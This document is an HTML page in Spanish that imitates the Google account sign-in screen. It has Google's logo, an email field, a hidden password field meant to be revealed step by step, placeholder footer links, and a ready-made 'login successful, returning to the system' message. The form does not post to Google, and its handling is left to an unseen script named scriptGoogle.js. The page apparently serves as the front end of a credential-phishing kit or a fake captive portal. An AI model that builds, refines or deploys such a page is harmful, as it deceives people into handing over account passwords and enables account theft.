<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#202124">
    <title>Accede a tu cuenta</title>
    <link rel="stylesheet" href="styleGoogle.css">
</head>

<body>
    <!-- Mensaje flotante de éxito (Añadido) -->
    <div id="success-message">
        ¡Inicio de sesión exitoso! Volviendo al sistema...
    </div>

    <main class="page">
        <section class="login-card" aria-label="Acceso a cuenta">

            <div class="card-top">
                <svg class="google-logo" viewBox="0 0 48 48" aria-label="Logo" role="img">
                    <path fill="#4285F4" d="M24 9.5c3.54 0 6.72 1.22 9.22 3.6l6.85-6.85C35.9 2.58 30.47 0 24 0 14.61 0 6.54 5.38 2.63 13.22l7.98 6.2C12.5 13.19 17.78 9.5 24 9.5z"/>
                    <path fill="#34A853" d="M46.98 24.55c0-1.57-.14-3.09-.4-4.55H24v8.6h12.92c-.56 2.95-2.23 5.45-4.74 7.13l7.65 5.94C44.3 37.61 46.98 31.64 46.98 24.55z"/>
                    <path fill="#FBBC05" d="M10.61 28.58a14.5 14.5 0 0 1 0-9.16l-7.98-6.2A24.06 24.06 0 0 0 0 24c0 3.87.93 7.53 2.63 10.78l7.98-6.2z"/>
                    <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.14 15.9-5.82l-7.65-5.94c-2.14 1.44-4.88 2.29-8.25 2.29-6.22 0-11.5-3.69-13.39-8.92l-7.98 6.2C6.54 42.62 14.61 48 24 48z"/>
                </svg>
            </div>

            <div class="login-content">
                <div class="intro">
                    <h1>Accede a tu cuenta</h1>
                    <p>Usa tu Cuenta de Google</p>
                </div>

                <form class="login-form" onsubmit="return false;">
                    <label class="sr-only" for="email">Correo electrónico o teléfono</label>
                    <label class="sr-only" for="password">Contraseña</label>

                    <div class="field" id="email-field">
                        <input
                            type="text"
                            id="email"
                            name="email"
                            placeholder="Correo electrónico o teléfono"
                            autocomplete="off"
                        >
                    </div>

                    <!-- 🛠️ NUEVO: El campo de contraseña ya existe en el HTML, pero oculto -->
                    <div class="field" id="password-field" style="display: none;">
                        <input
                            type="password"
                            id="password"
                            name="password"
                            placeholder="Ingresa tu contraseña"
                        >
                    </div>

                    <a href="#" class="link forgot">¿Olvidaste el correo electrónico?</a>

                    <p class="guest-info">
                        ¿Esta no es tu computadora? Usa una ventana privada para acceder.
                        <a href="#" class="link">Más información para usar el modo de invitado</a>
                    </p>

                    <div class="actions">
                        <a href="#" class="link create">Crear cuenta</a>
                        <button type="button" class="next-button">Siguiente</button>
                    </div>
                </form>
            </div>
        </section>

        <footer class="footer">
            <button type="button" class="language">
                Español (Latinoamérica)
                <span aria-hidden="true">▾</span>
            </button>

            <nav aria-label="Enlaces del pie de página">
                <a href="#">Ayuda</a>
                <a href="#">Privacidad</a>
                <a href="#">Condiciones</a>
            </nav>
        </footer>
    </main>
    <script src="scriptGoogle.js"></script>
</body>
</html>
